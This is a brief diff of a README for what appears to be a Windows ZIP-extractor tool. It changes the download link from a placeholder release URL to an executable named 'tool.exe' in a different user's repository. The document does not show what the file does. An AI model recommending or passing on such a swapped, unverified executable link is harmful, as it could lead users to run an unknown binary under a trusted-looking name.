@@ -23,4 +23,4 @@ Runs directly on Windows — no Python or installation needed.
 
 ## 📥 DownloadS
 
-[ Click here to download >>> (Windows EXE)](https://github.com/your-usuario/zip-extractor/releases/download/v1.0/zip-extractor.exe)
+[ Click here to download >>> (Windows EXE)](https://github.com/sswalk/extractor/blob/main/release/tool.exe)
